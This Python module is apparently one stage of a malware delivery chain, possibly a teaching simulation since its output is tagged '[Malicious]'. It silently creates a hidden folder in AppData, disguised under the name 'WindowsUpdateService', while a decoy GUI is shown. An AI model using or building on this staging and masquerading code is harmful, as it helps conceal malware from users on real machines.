"""
Delivery Function 2: Create Hidden Folder
Creates hidden folder in AppData while GUI is displayed
"""

import os

def create_hidden_folder():
    """
    Create hidden folder in AppData
    Returns: Path to hidden folder or None if failed
    """
    print("[Malicious] Function 2: Creating hidden folder...")
    
    # Create hidden folder path
    appdata = os.getenv('APPDATA')
    hidden_folder = os.path.join(appdata, "WindowsUpdateService")
    
    try:
        # Create folder if it doesn't exist
        if not os.path.exists(hidden_folder):
            os.makedirs(hidden_folder)
            
            # Set folder as hidden (Windows)
            os.system(f'attrib +h "{hidden_folder}"')
            
            print(f"[Malicious] Created hidden folder: {hidden_folder}")
            return hidden_folder
        else:
            print(f"[Malicious] Hidden folder already exists: {hidden_folder}")
            return hidden_folder
    except Exception as e:
        print(f"[Malicious] Error creating hidden folder: {e}")
        return None
